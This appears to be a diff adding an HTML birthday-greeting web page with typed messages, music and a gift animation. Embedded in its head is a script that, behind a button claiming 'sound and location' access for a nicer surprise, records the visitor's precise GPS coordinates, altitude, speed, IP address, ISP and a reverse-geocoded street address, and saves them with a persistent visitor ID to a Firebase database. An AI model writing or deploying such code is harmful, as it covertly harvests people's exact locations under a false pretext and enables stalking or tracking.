@@ -1,0 +1,397 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <!-- Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-X62J6Y3BD2"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        window.dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
+      gtag("config", "G-X62J6Y3BD2");
+    </script>
+
+    <title>Birthday Wish For You 💖</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Great+Vibes&display=swap"
+      rel="stylesheet"
+    />
+
+    <link rel="stylesheet" href="./styles.css" />
+
+    <!-- USER LOCATION AND VISIT TRACKING -->
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+      import {
+        getFirestore,
+        doc,
+        setDoc,
+        increment,
+        serverTimestamp
+      } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+      // Firebase configuration
+      const firebaseConfig = {
+        apiKey: "AIzaSyA3g4k-KltbyyuUHzmv6vPNeCQ_qm4MCI8",
+        authDomain: "latest-birthday-wish.firebaseapp.com",
+        projectId: "latest-birthday-wish",
+        storageBucket: "latest-birthday-wish.firebasestorage.app",
+        messagingSenderId: "266808188523",
+        appId: "1:266808188523:web:12d5f0fd3e3ca423619b2e",
+        measurementId: "G-R902LP7KYC"
+      };
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      let trackingStarted = false;
+
+      // Get or create a persistent ID for this browser.
+      function getVisitorId() {
+        let visitorId = localStorage.getItem("visitorId");
+
+        if (!visitorId) {
+          visitorId = "visitor_" + crypto.randomUUID();
+          localStorage.setItem("visitorId", visitorId);
+        }
+
+        return visitorId;
+      }
+
+      // Request the freshest, highest-accuracy position available.
+      function getGPSPosition() {
+        return new Promise((resolve, reject) => {
+          if (!navigator.geolocation) {
+            reject(new Error("Geolocation is not supported."));
+            return;
+          }
+
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              resolve({
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                altitude: position.coords.altitude,
+                heading: position.coords.heading,
+                speed: position.coords.speed,
+                timestamp: new Date(position.timestamp).toISOString()
+              });
+            },
+            (error) => {
+              reject(error);
+            },
+            {
+              enableHighAccuracy: true,
+              timeout: 60000,
+              maximumAge: 0
+            }
+          );
+        });
+      }
+
+      // Get public IP and approximate network location.
+      async function getIPData() {
+        const response = await fetch("https://ipapi.co/json/");
+
+        if (!response.ok) {
+          throw new Error("IP lookup failed: " + response.status);
+        }
+
+        const data = await response.json();
+
+        if (data.error) {
+          throw new Error(data.reason || "IP lookup failed");
+        }
+
+        return {
+          ip: data.ip ?? null,
+          city: data.city ?? null,
+          region: data.region ?? null,
+          country: data.country_name ?? null,
+          isp: data.org ?? null
+        };
+      }
+
+      // Convert coordinates to a readable, map-derived address.
+      async function getAddress(latitude, longitude) {
+        const url =
+          "https://nominatim.openstreetmap.org/reverse" +
+          "?format=jsonv2" +
+          "&lat=" + encodeURIComponent(latitude) +
+          "&lon=" + encodeURIComponent(longitude);
+
+        const response = await fetch(url);
+
+        if (!response.ok) {
+          throw new Error("Reverse geocoding failed.");
+        }
+
+        const data = await response.json();
+
+        return data.display_name ?? null;
+      }
+
+      // Main tracking function.
+      async function trackVisitor() {
+        const visitorId = getVisitorId();
+
+        // Start both requests independently.
+        const [ipResult, gpsResult] = await Promise.allSettled([
+          getIPData(),
+          getGPSPosition()
+        ]);
+
+        const visitorData = {
+          visitorId: visitorId,
+          browser: navigator.userAgent,
+          language: navigator.language,
+          screenWidth: window.innerWidth,
+          screenHeight: window.innerHeight,
+          page: window.location.pathname,
+          lastVisitedAt: serverTimestamp()
+        };
+
+        // Save IP-based information when available.
+        if (ipResult.status === "fulfilled") {
+          Object.assign(visitorData, ipResult.value);
+          visitorData.ipLookupStatus = "success";
+        } else {
+          visitorData.ipLookupStatus = "failed";
+          console.warn("IP lookup failed:", ipResult.reason);
+        }
+
+        // Save fresh GPS coordinates when available.
+        if (gpsResult.status === "fulfilled") {
+          const position = gpsResult.value;
+
+          visitorData.latitude = position.latitude;
+          visitorData.longitude = position.longitude;
+          visitorData.accuracy = position.accuracy;
+          visitorData.altitude = position.altitude;
+          visitorData.heading = position.heading;
+          visitorData.speed = position.speed;
+          visitorData.locationTimestamp = position.timestamp;
+          visitorData.gpsAllowed = true;
+          visitorData.locationStatus = "success";
+
+          // Reverse geocoding is optional.
+          try {
+            visitorData.exactAddress = await getAddress(
+              position.latitude,
+              position.longitude
+            );
+          } catch (error) {
+            visitorData.exactAddress = null;
+            console.warn("Address lookup failed:", error);
+          }
+        } else {
+          visitorData.latitude = null;
+          visitorData.longitude = null;
+          visitorData.accuracy = null;
+          visitorData.exactAddress = null;
+          visitorData.gpsAllowed = false;
+          visitorData.locationStatus = "unavailable";
+
+          const gpsError = gpsResult.reason;
+
+          if (gpsError && typeof gpsError.code === "number") {
+            visitorData.locationErrorCode = gpsError.code;
+            visitorData.locationError = gpsError.message;
+          } else {
+            visitorData.locationError =
+              gpsError?.message || "Location unavailable";
+          }
+
+          console.warn("GPS location unavailable:", gpsError);
+        }
+
+        // One Firestore document per browser.
+        // Increment visitCount atomically on each recorded visit.
+        await setDoc(
+          doc(db, "visitors", visitorId),
+          {
+            ...visitorData,
+            visitCount: increment(1),
+            lastVisitedAt: serverTimestamp()
+          },
+          { merge: true }
+        );
+
+        console.log("Visitor information saved successfully.");
+      }
+
+      // Called by the consent button.
+      async function requestLocation() {
+        if (trackingStarted) return;
+
+        trackingStarted = true;
+
+        // Hide the custom popup without displaying error alerts.
+        const popup = document.getElementById("locationPopup");
+        if (popup) {
+          popup.style.display = "none";
+        }
+
+        try {
+          await trackVisitor();
+        } catch (error) {
+          // Log errors only in the developer console.
+          console.error("Visitor tracking failed:", error);
+        }
+      }
+
+      // Make the function available to the inline HTML button.
+      window.requestLocation = requestLocation;
+    </script>
+  </head>
+
+  <body>
+    <!-- Location and tracking consent -->
+    <div id="locationPopup">
+      <div class="popup-box">
+        <h2>✨Personalized Experience</h2>
+
+        <p>
+          Allow sound and location access for a better surprise experience 💖
+        </p>
+
+        <button onclick="requestLocation()">
+          Allow Sound & Location
+        </button>
+      </div>
+    </div>
+
+    <div id="bg-particles"></div>
+    <div id="floating-hearts"></div>
+    <div id="floating-lights"></div>
+    <div id="confetti-layer"></div>
+    <div id="balloon-layer"></div>
+
+    <button
+      id="music-toggle"
+      class="music-toggle"
+      aria-label="Toggle music"
+    >
+      🔈 Music
+    </button>
+
+    <audio id="bg-music" loop preload="auto">
+      <source src="audio/music.mp3" type="audio/mpeg" />
+    </audio>
+
+    <main>
+      <section id="opening" class="scene full-screen">
+        <div class="queen left-queen">
+          <img src="images/blue-queen.jpg" alt="Blue Queen" />
+        </div>
+
+        <div class="center-content">
+          <p id="opening-text" class="typed-text"></p>
+          <button id="continue-btn" class="glow-btn">
+            Click to continue ✨
+          </button>
+        </div>
+
+        <div class="queen right-queen">
+          <img src="images/pink-queen.jpg" alt="Pink Queen" />
+        </div>
+      </section>
+
+      <section id="story" class="scene">
+        <div class="story-block reveal">
+          <img
+            src="https://images.unsplash.com/photo-1522673607200-164d1b6ce486?auto=format&fit=crop&w=1200&q=80"
+            alt="Warm memory"
+            class="story-image"
+          />
+
+          <div class="story-text">
+            <h2>A little story for you...</h2>
+            <p>
+              Every smile, every little moment, every memory somehow shines
+              brighter with you in it.
+            </p>
+          </div>
+        </div>
+
+        <div class="story-block reveal reverse">
+          <img
+            src="https://images.unsplash.com/photo-1529333166437-7750a6dd5a70?auto=format&fit=crop&w=1200&q=80"
+            alt="Beautiful day"
+            class="story-image"
+          />
+
+          <div class="story-text">
+            <div class="birthday-pill reveal">
+              <span class="birthday-pill-label">On</span>
+              <span id="birthday-date"></span>
+            </div>
+
+            <h2>An angel was born...</h2>
+            <p id="angel-message"></p>
+          </div>
+        </div>
+      </section>
+
+      <section id="message" class="scene full-screen">
+        <div class="message-backdrop"></div>
+
+        <div class="message-content">
+          <h2>✉️ A small note for you</h2>
+          <p id="heartfelt-typed"></p>
+        </div>
+      </section>
+
+      <section id="surprise" class="scene full-screen">
+        <div class="surprise-content">
+          <h2>🎁 Your Interactive Surprise</h2>
+
+          <button id="gift-box" class="gift-box" aria-label="Open gift">
+            🎁
+          </button>
+
+          <p id="gift-hint">Tap the gift to open your surprise</p>
+        </div>
+      </section>
+
+      <section id="ending" class="scene full-screen">
+        <div class="night-sky"></div>
+
+        <div class="ending-content">
+          <h2 class="ending-line">
+            Happy Birthday
+            <span id="birthday-friend-name" class="neon-pink"></span> ...
+          </h2>
+
+          <p class="ending-subline">
+            May your life always glow with love and joy. 🌙
+          </p>
+
+          <a href="#" id="whatsapp-link" target="_blank" class="made-by">
+            <img src="images/mypic.jpeg" alt="Your photo" />
+            <span>Tap if you liked it 😊</span>
+          </a>
+        </div>
+      </section>
+
+      <section id="tease" class="scene full-screen">
+        <div class="tease-content">
+          <h2>Okay… one last thing Bank ki Emp.😜</h2>
+          <p id="tease-typed"></p>
+        </div>
+      </section>
+    </main>
+
+    <script src="./script.js"></script>
+  </body>
+</html>
